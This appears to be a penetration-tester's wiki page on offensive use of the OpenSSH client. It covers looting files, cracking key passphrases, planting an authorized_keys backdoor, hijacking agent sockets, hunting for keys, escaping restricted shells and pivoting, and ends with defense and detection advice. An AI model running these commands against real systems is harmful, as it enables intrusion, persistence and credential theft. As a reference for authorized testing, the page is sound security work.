# ssh

The OpenSSH client as an offensive multitool: move files, log in with a password/key, forward ports to pivot, and abuse what you find on a foothold (reused keys, writable `authorized_keys`, live agents). Flag reference and tradecraft — the pivot playbook in depth is [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md); the login-in-context version is [Remote Access — SSH](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#ssh-22--the-standard-linux-shell).

> Authorized engagements only. Key reuse and `authorized_keys` writes are persistence — note them in the report and clean them up.

## Contents

- [File transfer — scp / sftp / rsync](#file-transfer--scp--sftp--rsync)
- [Getting in](#getting-in)
- [Run a command without a shell](#run-a-command-without-a-shell)
- [Port forwarding & pivoting](#port-forwarding--pivoting)
- [Escalation & persistence via SSH](#escalation--persistence-via-ssh)
- [Escape a restricted shell](#escape-a-restricted-shell)
- [Other useful flags](#other-useful-flags)
- [Defense / detection](#defense--detection)
- [Related](#related)

## File transfer — scp / sftp / rsync

The first thing you want on a box. **`scp` uses `-P` for the port; `ssh` uses `-p`** — the single most common mistake.

```bash
# scp — copy over SSH
scp file user@<target>:/tmp/                 # push TO the target
scp user@<target>:/etc/passwd ./             # pull FROM the target
scp -r localdir user@<target>:/tmp/          # recurse a directory
scp -i id_rsa file user@<target>:/tmp/       # with a key
scp -P 2222 file user@<target>:/tmp/         # non-default port (CAPITAL -P)
scp -O file user@<target>:/tmp/              # force the legacy protocol if the new sftp-backed scp fails
scp -o 'ProxyJump user@PIVOT' file user@<internal>:/tmp/   # through a jump host

# sftp — interactive (get / put / ls / lcd / !localcmd)
sftp user@<target>
sftp -i id_rsa user@<target>

# rsync over ssh — resumable, ideal for large or interrupted loot pulls
rsync -avz -e ssh user@<target>:/var/www/ ./www/

# No scp/sftp on the box? Stream over a plain ssh exec:
ssh user@<target> 'cat /path/to/file' > loot            # pull
cat local_file | ssh user@<target> 'cat > /tmp/file'    # push
```

## Getting in

```bash
ssh user@<target>
ssh -p 2222 user@<target>                               # non-default port (lowercase -p)
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no user@<target>   # scripted password (labs)

# Key-based (looted an id_rsa during enumeration)
chmod 600 id_rsa && ssh -i id_rsa user@<target>

# Crack a passphrase-protected key, then use it
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash

# Skip the host-key prompt / avoid a poisoned known_hosts on re-used lab IPs
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@<target>

# Force password auth when a key is offered first (or vice-versa)
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no user@<target>
```

Validate creds at scale with `nxc ssh` — see [Credentialed Enumeration & Access](../Enum/Credentialed%20Enumeration%20%26%20Access.md#ssh--sftp-22).

## Run a command without a shell

```bash
ssh user@<target> 'id; uname -a; sudo -n true && echo PASSWORDLESS-SUDO'   # run and return
ssh user@<target> 'bash -s' < local_script.sh          # pipe a local script to run remotely
ssh -t user@<target> 'sudo -i'                          # -t forces a TTY (needed for sudo/interactive)
```

## Port forwarding & pivoting

The essentials — the full playbook (sshuttle, multi-hop, chisel, ligolo) is in [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md).

```bash
ssh -L 8080:10.10.20.5:80 user@PIVOT         # LOCAL: reach internal :80 at your localhost:8080
ssh -D 1080 user@PIVOT                        # DYNAMIC SOCKS proxy — pair with proxychains
ssh -R 9001:127.0.0.1:9001 user@PIVOT         # REVERSE: pivot can't take inbound, so it dials back to you
ssh -J user@PIVOT user@INTERNAL               # JUMP through a host (ProxyJump) in one hop
ssh -fN -L 8080:10.10.20.5:80 user@PIVOT      # -f background, -N no remote command = just the tunnel
```

Memory aid: `-L` brings a remote port **to you**, `-R` pushes a local port **to them**, `-D` is a whole-subnet SOCKS proxy.

## Escalation & persistence via SSH

What to do with SSH material found on a foothold:

```bash
# Key reuse — a looted key often opens other hosts (rampant in the wild and in labs)
chmod 600 id_rsa && ssh -i id_rsa user@<other-host>

# Writable ~/.ssh/authorized_keys = instant backdoor / lateral into that account
mkdir -p ~victim/.ssh && echo 'ssh-ed25519 AAAA...you' >> ~victim/.ssh/authorized_keys

# Live SSH agent left by another user/root — borrow their keys without the key file
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l          # list keys in a found agent socket
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@<internal> # authenticate as them

# You landed where someone used `ssh -A` (agent forwarding) — their agent is now yours
echo "$SSH_AUTH_SOCK" && ssh-add -l

# Harvest the next targets and creds from the box
cat ~/.ssh/config ~/.ssh/known_hosts /etc/hosts 2>/dev/null
find / \( -name 'id_*' -o -name 'authorized_keys' -o -name '*.pem' \) 2>/dev/null
```

The write-to-`.ssh` angle and broader credential hunting live in [Privilege Escalation — general](../Privilege%20Escalation/general.md); agent-forwarding abuse ties into [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md).

## Escape a restricted shell

A constrained `rbash`/menu shell delivered over SSH can sometimes be broken on the way in:

```bash
ssh user@<target> -t 'exec bash --noprofile --norc'    # ask for a clean bash instead of their shell
ssh user@<target> -t '/bin/sh -i'                       # or force an interactive sh
```

## Other useful flags

| Flag | Use |
| --- | --- |
| `-v` / `-vvv` | Debug auth failures — shows which methods are offered/rejected |
| `-C` | Compress — helps a slow link or a big transfer |
| `-N` / `-f` | No remote command / background — for tunnels you don't want a shell on |
| `-o ServerAliveInterval=60` | Keep a long-lived tunnel or shell from idling out |
| `-o ControlMaster=auto -o ControlPath=/tmp/.s-%r@%h:%p -o ControlPersist=10m` | Multiplex — reuse one TCP/auth for many sessions (faster, one log entry) |
| `-g` | Let other hosts use your local-forwarded port (open a `-L` to the network) |

## Defense / detection

- **Key-only auth**, disable password login and `PermitRootLogin no`; scope with `AllowUsers`/`AllowGroups`.
- Alert on **`authorized_keys` changes** (FIM) and new key fingerprints — that's the persistence tell.
- Disable **agent forwarding** (`AllowAgentForwarding no`) and **TCP forwarding** (`AllowTcpForwarding no`) on hosts that don't need them — kills the agent-hijack and pivot paths.
- `fail2ban` on auth failures; log/alert on logins from new source IPs and on sudden port-forwarding by a workstation (it's acting as a router).

## Related

[Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#ssh-22--the-standard-linux-shell) · [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md) · [Credentialed Enumeration & Access](../Enum/Credentialed%20Enumeration%20%26%20Access.md#ssh--sftp-22) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) · [Privilege Escalation — general](../Privilege%20Escalation/general.md) · [rdp](rdp.md) · [Shell](../Shell/README.md) · [folder README](README.md)
